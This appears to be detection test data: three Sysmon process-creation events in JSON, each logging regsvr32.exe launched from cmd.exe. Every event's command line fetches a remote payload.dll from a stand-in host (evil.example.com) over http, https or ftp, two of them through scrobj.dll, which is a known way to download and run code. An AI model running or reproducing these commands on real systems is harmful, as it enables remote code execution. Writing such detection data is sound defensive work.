{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-07-10T21:21:14.198610Z"
        }
      },
      "EventRecordID": 39043,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3512,
          "ThreadID": 4068
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-07-10 21:21:14.160",
      "ProcessGuid": "0197231E-624A-6A51-F101-000000000B00",
      "ProcessId": 5644,
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "FileVersion": "10.0.26100.2454 (WinBuild.160101.0800)",
      "Description": "Microsoft(C) Register Server",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "REGSVR32.EXE",
      "CommandLine": "regsvr32.exe  /s /i http://evil.example.com/payload.dll scrobj.dll",
      "CurrentDirectory": "C:\\Users\\xodih\\",
      "User": "swachchhanda\\xodih",
      "LogonGuid": "0197231E-60B5-6A51-A9B0-060000000000",
      "LogonId": "0x6b0a9",
      "TerminalSessionId": 1,
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=97EAEA180C46B80F073B7DB69C98295E,SHA256=45AED0898DF298DB21DB5DED14A9E924DF96A50FE4C54D277614A32A3B1F4BDD,IMPHASH=B97B463A890E3AC4F4046202A545DC97",
      "ParentProcessGuid": "0197231E-61D7-6A51-B101-000000000B00",
      "ParentProcessId": 5212,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
      "ParentUser": "swachchhanda\\xodih"
    }
  }
}
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-07-10T21:21:14.229130Z"
        }
      },
      "EventRecordID": 39044,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3512,
          "ThreadID": 4068
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-07-10 21:21:14.210",
      "ProcessGuid": "0197231E-624A-6A51-F201-000000000B00",
      "ProcessId": 1612,
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "FileVersion": "10.0.26100.2454 (WinBuild.160101.0800)",
      "Description": "Microsoft(C) Register Server",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "REGSVR32.EXE",
      "CommandLine": "regsvr32.exe  /s /i https://evil.example.com/payload.dll scrobj.dll",
      "CurrentDirectory": "C:\\Users\\xodih\\",
      "User": "swachchhanda\\xodih",
      "LogonGuid": "0197231E-60B5-6A51-A9B0-060000000000",
      "LogonId": "0x6b0a9",
      "TerminalSessionId": 1,
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=97EAEA180C46B80F073B7DB69C98295E,SHA256=45AED0898DF298DB21DB5DED14A9E924DF96A50FE4C54D277614A32A3B1F4BDD,IMPHASH=B97B463A890E3AC4F4046202A545DC97",
      "ParentProcessGuid": "0197231E-61D7-6A51-B101-000000000B00",
      "ParentProcessId": 5212,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
      "ParentUser": "swachchhanda\\xodih"
    }
  }
}
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-07-10T21:21:15.126452Z"
        }
      },
      "EventRecordID": 39045,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3512,
          "ThreadID": 4068
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2026-07-10 21:21:15.108",
      "ProcessGuid": "0197231E-624B-6A51-F301-000000000B00",
      "ProcessId": 6916,
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "FileVersion": "10.0.26100.2454 (WinBuild.160101.0800)",
      "Description": "Microsoft(C) Register Server",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "REGSVR32.EXE",
      "CommandLine": "regsvr32.exe  /s /i ftp://evil.example.com/payload.dll",
      "CurrentDirectory": "C:\\Users\\xodih\\",
      "User": "swachchhanda\\xodih",
      "LogonGuid": "0197231E-60B5-6A51-A9B0-060000000000",
      "LogonId": "0x6b0a9",
      "TerminalSessionId": 1,
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=97EAEA180C46B80F073B7DB69C98295E,SHA256=45AED0898DF298DB21DB5DED14A9E924DF96A50FE4C54D277614A32A3B1F4BDD,IMPHASH=B97B463A890E3AC4F4046202A545DC97",
      "ParentProcessGuid": "0197231E-61D7-6A51-B101-000000000B00",
      "ParentProcessId": 5212,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
      "ParentUser": "swachchhanda\\xodih"
    }
  }
}
